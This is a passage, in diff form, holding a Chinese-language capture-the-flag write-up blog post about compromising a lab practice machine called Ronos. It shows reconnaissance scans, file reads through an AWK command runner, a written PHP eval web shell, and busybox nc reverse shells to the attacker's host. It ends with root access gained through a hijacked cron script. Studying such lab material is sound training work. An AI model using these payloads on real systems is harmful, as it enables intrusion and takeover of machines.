@@ -1,0 +1,169 @@
+<!doctype html><html lang=zh-cn><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>群友靶机Ronos - Twansh's blog</title><link rel=icon href=/logo.png><script>(function(){localStorage.removeItem("flavor-theme");var t=window.matchMedia("(prefers-color-scheme: dark)"),e=sessionStorage.getItem("flavor-theme-override");if(e==="light"||e==="dark"){document.documentElement.setAttribute("data-theme",e);return}document.documentElement.setAttribute("data-theme",t.matches?"dark":"light")})()</script><link rel=preload as=font type=font/woff2 href=/fonts/tsanger-jinkai02/20307ec77575b65807a8b0c5b7201f43.woff2 crossorigin><link rel=preload as=style href=/fonts/tsanger-jinkai02/result.css onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=/fonts/tsanger-jinkai02/result.css></noscript><link rel=stylesheet href=/scss/main.min.f9483bf4231821718c79757993df7674f414a796ac0bd206f89cc6c81e39cb27.css><meta name=description content="依旧保持内裤干燥"><meta name=author content="Twansh"><meta name=robots content="index,follow,max-image-preview:large"><meta name=keywords content="Cyberspace Security,CTF,Web Security,Penetration Testing,Offensive,靶机"><link rel=canonical href=https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/><meta property="og:site_name" content="Twansh's blog"><meta property="og:title" content="群友靶机Ronos - Twansh's blog"><meta property="og:description" content="依旧保持内裤干燥"><meta property="og:type" content="article"><meta property="og:url" content="https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://3a0.top/logo.png"><meta property="og:image:alt" content="群友靶机Ronos"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="群友靶机Ronos - Twansh's blog"><meta name=twitter:description content="依旧保持内裤干燥"><meta name=twitter:image content="https://3a0.top/logo.png"><meta property="article:published_time" content="2025-10-07T15:22:53Z"><meta property="article:modified_time" content="2025-10-07T15:22:53Z"><meta property="article:section" content="Offensive"><meta property="article:tag" content="靶机"><script type=application/ld+json>{"@context":"https://schema.org","@graph":[{"@id":"https://3a0.top/#website","@type":"WebSite","description":"Cyberspace Security / CTF / Web 安全，记录学习和生活。","inLanguage":"zh-cn","name":"Twansh's blog","url":"https://3a0.top/"},{"@id":"https://3a0.top/about/#author","@type":"Person","email":"eminemgcxwlp@gmail.com","name":"Twansh","sameAs":["https://github.com/GCXWLP"],"url":"https://3a0.top/about/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/#article","@type":"BlogPosting","author":{"@id":"https://3a0.top/about/#author"},"dateModified":"2025-10-07T15:22:53Z","datePublished":"2025-10-07T15:22:53Z","description":"依旧保持内裤干燥","headline":"群友靶机Ronos","image":["https://3a0.top/logo.png"],"inLanguage":"zh-cn","isPartOf":{"@id":"https://3a0.top/#website"},"keywords":["Offensive","靶机"],"mainEntityOfPage":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/","url":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/"},{"@id":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/#breadcrumb","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://3a0.top/","name":"Home","position":1},{"@type":"ListItem","item":"https://3a0.top/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAronos/","name":"群友靶机Ronos","position":2}]}]}</script></head><body><nav class=navbar id=navbar><div class=navbar__inner><a class=navbar__brand href=/><span>Twansh's blog</span></a><div class=navbar__right><ul class=navbar__links id=nav-links><li><a href=/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="21 8 21 21 3 21 3 8"/><rect x="1" y="3" width="22" height="5"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 007.54.54l3-3a5 5 0 00-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 00-7.54-.54l-3 3a5 5 0 007.07 7.07l1.71-1.71"/></svg>
+<span>Links</span></a></li><li><a href=/travel/><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
+<span>Travel</span></a></li></ul><button class=navbar__btn id=search-btn type=button aria-label=Search>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+</button>
+<button class=navbar__btn id=theme-toggle type=button aria-label="Toggle theme">
+<svg class="icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
+<svg class="icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+</button>
+<button class="navbar__btn navbar__hamburger" id=hamburger type=button aria-label=Menu>
+<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="18" x2="21" y2="18"/></svg></button></div></div></nav><div class=site-content><div class=post-layout><article class="post-layout__content post-single"><header class=post-single__header><div class=post-single__meta><time datetime=2025-10-07 data-pagefind-meta=date[datetime]>Oct 07, 2025</time>
+<span class=sep>·</span>
+<span>3 min read</span>
+<span class=sep>·</span>
+<span>636 words</span>
+<span class=sep>·</span>
+<a href=/categories/offensive/ class=post-single__category data-pagefind-filter=category>Offensive</a></div><h1 class=post-single__title data-pagefind-meta=title>群友靶机Ronos</h1></header><div class=article-content data-pagefind-body><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# arp-scan -l
+</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:66:2a:e1, IPv4: 192.168.56.102
+</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with <span class=m>256</span> hosts <span class=o>(</span>https://github.com/royhills/arp-scan<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.1    0a:00:27:00:00:0d       <span class=o>(</span>Unknown: locally administered<span class=o>)</span>
+</span></span><span class=line><span class=cl>192.168.56.100  08:00:27:b3:17:ee       PCS Systemtechnik GmbH
+</span></span><span class=line><span class=cl>192.168.56.109  08:00:27:b2:b2:cb       PCS Systemtechnik GmbH
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>3</span> packets received by filter, <span class=m>0</span> packets dropped by kernel
+</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: <span class=m>256</span> hosts scanned in 2.023 seconds <span class=o>(</span>126.54 hosts/sec<span class=o>)</span>. <span class=m>3</span> responded
+</span></span><span class=line><span class=cl>                                                                                                                                                                                   
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nmap -sC -sV -p- 192.168.56.109
+</span></span><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-10-09 13:18 +08
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.56.109
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00049s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.62 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: AWK Command Runner
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.62 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>MAC Address: 08:00:27:B2:B2:CB <span class=o>(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 21.16 seconds
+</span></span><span class=line><span class=cl>                                                               
+</span></span></code></pre></div><p>信息收集，firefox访问发现是awk在线运行，做过很多了，awk直接读/etc/passwd</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s1>&#39;{ print $0 }&#39;</span> /etc/passwd &gt; 2.txt
+</span></span></code></pre></div><p>重定向到2.txt，然后访问<br>192.168.56.109/2.txt</p><p>读到/etc/passwd</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root:x:0:0:root:/root:/bin/bash
+</span></span><span class=line><span class=cl>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sys:x:3:3:sys:/dev:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sync:x:4:65534:sync:/bin:/bin/sync
+</span></span><span class=line><span class=cl>games:x:5:60:games:/usr/games:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>gnats:x:41:41:Gnats Bug-Reporting System <span class=o>(</span>admin<span class=o>)</span>:/var/lib/gnats:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
+</span></span><span class=line><span class=cl>twansh:x:1000:1000:,,,:/home/twansh:/bin/bash
+</span></span><span class=line><span class=cl>david:x:1001:1001::/home/david:/bin/bash
+</span></span></code></pre></div><p>发现三个用户(看到Twansh的那个时候我小脑抽了一下，所以我就没管twansh，全在做david，结果到最后才发现真正的flag其实就藏在twansh之下(可恶，以为是自己的ID就掉以轻心了😓))</p><p>所以可以直接读/home/twansh/user.txt先输出user组的flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s1>&#39;{ print $0 }&#39;</span> /home/twansh/user.txt &gt; 1.txt
+</span></span></code></pre></div><p>flag{user-0c4da5e7f8a886869575ae0a046f1841}</p><p>既然可以实现文件的任意读取和写入，那么直接写webshell是最佳选择</p><p>由whatweb可以知道这个是php的web后端，写入一句话木马，然后弹shell</p><p>在菜鸟教程中，给出这样子的实例是输出hello world，那么只要加上重定向，就可以把文件写入指定目录下的指定文件</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>BEGIN <span class=o>{</span> print <span class=s2>&#34;Hello, world!&#34;</span> <span class=o>}</span>
+</span></span></code></pre></div><p>直接写吧害</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=s1>&#39;BEGIN { print &#34;&lt;?php @eval($_GET[1])?&gt;&#34; &gt; &#34;shell.php&#34; }&#39;</span>
+</span></span></code></pre></div><p>firefox访问</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://192.168.56.109/shell.php?1<span class=o>=</span>system<span class=o>(</span>%27id%27<span class=o>)</span><span class=p>;</span>
+</span></span></code></pre></div><p>发现成功回显id信息</p><p>接下来利用busybox反弹shell</p><p>直接传参</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>http://192.168.56.109/shell.php?1<span class=o>=</span>system<span class=o>(</span>%27busybox%20nc%20192.168.56.102%207777%20-e%20sh%27<span class=o>)</span><span class=p>;</span>
+</span></span></code></pre></div><p>本地监听即可</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nc -lnvp <span class=m>7777</span>                  
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>7777</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.56.102<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.56.109<span class=o>]</span> <span class=m>37742</span>
+</span></span><span class=line><span class=cl>ls
+</span></span><span class=line><span class=cl>1.txt
+</span></span><span class=line><span class=cl>2.txt
+</span></span><span class=line><span class=cl>3.txt
+</span></span><span class=line><span class=cl>index.php
+</span></span><span class=line><span class=cl>info.php
+</span></span><span class=line><span class=cl>note.php
+</span></span><span class=line><span class=cl>output.txt
+</span></span><span class=line><span class=cl>sample.txt
+</span></span><span class=line><span class=cl>shell.php
+</span></span></code></pre></div><p>可以看到我之前尝试的时候写过多少测试，哈哈哈哈</p><p>然后找了挺久没有结果<br>看wp才知道在/opt目录下有猫腻，也就是</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@Ronos:/opt/twansh_pipe$ ls -al
+</span></span><span class=line><span class=cl>ls -al
+</span></span><span class=line><span class=cl>total <span class=m>8</span>
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> root   root     <span class=m>4096</span> Oct  <span class=m>6</span> 07:45 .
+</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>3</span> root   root     <span class=m>4096</span> Oct  <span class=m>6</span> 11:15 ..
+</span></span><span class=line><span class=cl>prw-rw---- <span class=m>1</span> twansh www-data    <span class=m>0</span> Oct  <span class=m>6</span> 07:45 command_pipe
+</span></span></code></pre></div><p>有一个command_pipe，这个应该就是用于通信的管道，应该得用pspy来监控一下进程的。然后写脚本去监听twansh的shell，来实现提权到user，但是这里没啥必要了，因为九头蛇爆出twansh的密码了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>twansh@Ronos:~$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>twansh<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>twansh<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>twansh<span class=o>)</span>
+</span></span></code></pre></div><p>也是成功做到了</p><p>接下来要做的就是尝试提权到root了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>twansh@Ronos:/$ <span class=nb>cd</span> var
+</span></span><span class=line><span class=cl>twansh@Ronos:/var$ ls
+</span></span><span class=line><span class=cl>backups  cache  lib  <span class=nb>local</span>  lock  log  mail  opt  run  spool  tmp  www
+</span></span><span class=line><span class=cl>twansh@Ronos:/var$ <span class=nb>cd</span> backups
+</span></span><span class=line><span class=cl>twansh@Ronos:/var/backups$ ls
+</span></span><span class=line><span class=cl>alternatives.tar.0     apt.extended_states.1.gz  apt.extended_states.3.gz  cron.bak           dpkg.statoverride.0  group.bak    passwd.bak
+</span></span><span class=line><span class=cl>apt.extended_states.0  apt.extended_states.2.gz  apt.extended_states.4.gz  dpkg.diversions.0  dpkg.status.0        gshadow.bak  shadow.bak
+</span></span><span class=line><span class=cl>twansh@Ronos:/var/backups$ cat passwd.bak
+</span></span><span class=line><span class=cl>cat: passwd.bak: Permission denied
+</span></span><span class=line><span class=cl>twansh@Ronos:/var/backups$ cak cron.bak
+</span></span><span class=line><span class=cl>-bash: cak: <span class=nb>command</span> not found
+</span></span><span class=line><span class=cl>twansh@Ronos:/var/backups$ cat cron.bak
+</span></span><span class=line><span class=cl><span class=c1># Edit this file to introduce tasks to be run by cron.</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># Each task to run has to be defined through a single line</span>
+</span></span><span class=line><span class=cl><span class=c1># indicating with different fields when the task will be run</span>
+</span></span><span class=line><span class=cl><span class=c1># and what command to run for the task</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># To define the time you can provide concrete values for</span>
+</span></span><span class=line><span class=cl><span class=c1># minute (m), hour (h), day of month (dom), month (mon),</span>
+</span></span><span class=line><span class=cl><span class=c1># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># Notice that tasks will be started based on the cron&#39;s system</span>
+</span></span><span class=line><span class=cl><span class=c1># daemon&#39;s notion of time and timezones.</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># Output of the crontab jobs (including errors) is sent through</span>
+</span></span><span class=line><span class=cl><span class=c1># email to the user the crontab file belongs to (unless redirected).</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># For example, you can run a backup of all your user accounts</span>
+</span></span><span class=line><span class=cl><span class=c1># at 5 a.m every week with:</span>
+</span></span><span class=line><span class=cl><span class=c1># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># For more information see the manual pages of crontab(5) and cron(8)</span>
+</span></span><span class=line><span class=cl><span class=c1># </span>
+</span></span><span class=line><span class=cl><span class=c1># m h  dom mon dow   command</span>
+</span></span><span class=line><span class=cl>* * * * * /tmp/back.sh
+</span></span></code></pre></div><p>这个玩意可以利用<br>看看AI的解释</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>五个星号分别代表：分钟 分钟/小时/日/月/星期（m h dom mon dow）。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>* 表示“任意值”或“每一个”。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>因此 * * * * * 表示每分钟都执行一次。
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/tmp/back.sh 是要执行的命令/脚本路径 —— 所以这条任务每分钟执行 /tmp/back.sh
+</span></span></code></pre></div><p>所以这个定时任务，只要我们事先写入事件，这个定时任务就是可控的，每分钟执行一次</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>twansh@Ronos:/$ cat /tmp/back.sh
+</span></span><span class=line><span class=cl>cat: /tmp/back.sh: No such file or directory
+</span></span></code></pre></div><p>发现没有这玩意，那我写一个进去好了</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>twansh@Ronos:/$ vim /tmp/back.sh
+</span></span><span class=line><span class=cl>twansh@Ronos:/$ cat /tmp/back.sh
+</span></span><span class=line><span class=cl><span class=c1>#!/bin/bash</span>
+</span></span><span class=line><span class=cl>busybox nc 192.168.56.102 <span class=m>7777</span> -e /bin/sh
+</span></span></code></pre></div><p>成功监听到root的shell</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nc -lnvp <span class=m>7777</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>7777</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>192.168.56.102<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>192.168.56.109<span class=o>]</span> <span class=m>45322</span>
+</span></span><span class=line><span class=cl>id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
+</span></span></code></pre></div><p>剩下的就不用多说了嘿嘿嘿，结束结束，也是学到了新东西了</p></div><footer class=post-footer><div class=post-footer__tags><a href=/tags/%E9%9D%B6%E6%9C%BA/ data-pagefind-filter=tag>靶机</a></div><div class=post-footer__license>Licensed under CC BY-NC-SA 4.0</div><nav class=post-footer__nav><a href=/p/git%E5%AD%A6%E4%B9%A0%E8%AF%A6%E7%BB%86%E8%AE%B0%E5%BD%95/><small>← Previous</small>
+<span>Git学习详细记录</span>
+</a><a href=/p/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BAcombine/ class=post-footer__nav-next><small>Next →</small>
+<span>群友靶机Combine</span></a></nav></footer></article></div></div><footer class=site-footer><div class=container><div class=site-footer__social><a href=https://github.com/GCXWLP target=_blank rel=noopener title=GitHub><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg>
+</a><a href=mailto:eminemgcxwlp@gmail.com target=_blank rel=noopener title=Email><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1.0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1.0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+</a><a href=/index.xml target=_blank rel=noopener title=RSS><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 019 9"/><path d="M4 4a16 16 0 0116 16"/><circle cx="5" cy="19" r="1"/></svg></a></div><div class=site-footer__copy>&copy; 2025 - 2026 Twansh's blog</div><div class=site-footer__stats><span>65 posts</span>
+<span>73.3k words</span></div><div class=site-footer__powered>Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a></div></div></footer><div class=search-overlay id=search-overlay role=dialog aria-label=Search><div class=search-overlay__dialog><div class=search-overlay__input-wrap><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+<input type=text id=search-input placeholder=搜索文章标题、标签、分类或正文... autocomplete=off></div><div class=search-overlay__results id=search-results><div class=search-overlay__empty>输入关键词开始搜索</div></div></div></div><script defer src=/js/theme-toggle.min.9d3288aa4ff1e33e40906fb67350ea3f5dad1533f19d7428a2335ceac6bf3c4e.js></script><script defer src=/js/search.min.6145f9c11b47c22f4014c24c80522fe739d7844fc997719a3bc26c050c908051.js></script><script defer src=/js/code-copy.min.f61de5ab74980e8e52ca0081d6fedb33bc5496b41391a410ef15ed6e014e502d.js></script></body></html>
